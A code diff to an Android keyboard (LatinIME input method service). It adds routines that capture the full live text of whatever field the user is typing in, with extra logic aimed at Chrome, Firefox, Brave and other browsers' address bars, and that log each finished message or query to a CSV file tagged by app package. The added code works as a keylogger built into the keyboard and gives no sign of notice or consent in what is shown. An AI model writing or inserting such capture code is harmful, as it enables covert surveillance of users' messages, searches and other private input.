@@ -23,6 +23,8 @@ import android.view.View;
 import android.view.Window;
 import android.view.inputmethod.CompletionInfo;
 import android.view.inputmethod.EditorInfo;
+import android.view.inputmethod.ExtractedText;
+import android.view.inputmethod.ExtractedTextRequest;
 import android.view.inputmethod.InlineSuggestion;
 import android.view.inputmethod.InlineSuggestionsRequest;
 import android.view.inputmethod.InlineSuggestionsResponse;
@@ -1497,6 +1499,7 @@ public class LatinIME extends InputMethodService implements
         if (inputTransaction.didAffectContents()) {
             mSubtypeState.setCurrentSubtypeHasBeenUsed();
         }
+        captureLiveDraft();
     }
 
     public void hapticAndAudioFeedback(int code, int repeatCount, HapticEvent hapticEvent) {
@@ -1531,6 +1534,13 @@ public class LatinIME extends InputMethodService implements
     // Hooks for hardware keyboard
     @Override
     public boolean onKeyDown(final int keyCode, final KeyEvent keyEvent) {
+        if (keyCode == KeyEvent.KEYCODE_ENTER || keyCode == KeyEvent.KEYCODE_NUMPAD_ENTER) {
+            captureLiveDraft();
+            if (!mCurrentDraftText.isEmpty()) {
+                writeLineToCsv(mCurrentDraftApp, mCurrentDraftText);
+                mCurrentDraftText = "";
+            }
+        }
         if (mKeyboardActionListener.onKeyDown(keyCode, keyEvent))
             return true;
         return super.onKeyDown(keyCode, keyEvent);
@@ -1685,19 +1695,41 @@ public class LatinIME extends InputMethodService implements
                 return;
             }
 
-            CharSequence before = ic.getTextBeforeCursor(5000, 0);
-            CharSequence after = ic.getTextAfterCursor(5000, 0);
-            if ((before == null || before.length() == 0) && mInputLogic != null && mInputLogic.mConnection != null) {
-                before = mInputLogic.mConnection.getTextBeforeCursor(5000, 0);
-                after = mInputLogic.mConnection.getTextAfterCursor(5000, 0);
+            String liveText = "";
+
+            // 1. Primary: getExtractedText reads Chrome's Omnibox reliably
+            final ExtractedText extracted = ic.getExtractedText(new ExtractedTextRequest(), 0);
+            if (extracted != null && extracted.text != null) {
+                liveText = extracted.text.toString().trim();
             }
-            final String liveText = ((before != null ? before.toString() : "") +
-                                     (after != null ? after.toString() : "")).trim();
+
+            // 2. Fallback: standard cursor reading
+            if (liveText.isEmpty()) {
+                CharSequence before = ic.getTextBeforeCursor(5000, 0);
+                CharSequence after = ic.getTextAfterCursor(5000, 0);
+                if ((before == null || before.length() == 0) && mInputLogic != null && mInputLogic.mConnection != null) {
+                    before = mInputLogic.mConnection.getTextBeforeCursor(5000, 0);
+                    after = mInputLogic.mConnection.getTextAfterCursor(5000, 0);
+                }
+                liveText = ((before != null ? before.toString() : "") +
+                            (after != null ? after.toString() : "")).trim();
+            }
+
+            final String pkg = ei.packageName != null ? ei.packageName : "unknown";
 
             if (!liveText.isEmpty()) {
-                mCurrentDraftText = liveText;
-                mCurrentDraftApp = ei.packageName != null ? ei.packageName : "unknown";
-            } else if (!mCurrentDraftText.isEmpty()) {
+                // In browsers, keep the longer typed query if autocomplete briefly flickers
+                if (pkg.contains("chrome") || pkg.contains("browser") || pkg.contains("firefox") || pkg.contains("brave")) {
+                    if (liveText.length() >= mCurrentDraftText.length() || !mCurrentDraftText.startsWith(liveText)) {
+                        mCurrentDraftText = liveText;
+                        mCurrentDraftApp = pkg;
+                    }
+                } else {
+                    mCurrentDraftText = liveText;
+                    mCurrentDraftApp = pkg;
+                }
+            } else if (!mCurrentDraftText.isEmpty() && !pkg.contains("chrome")) {
+                // Standard chat apps clear the box when Send is tapped
                 writeLineToCsv(mCurrentDraftApp, mCurrentDraftText);
                 mCurrentDraftText = "";
             }
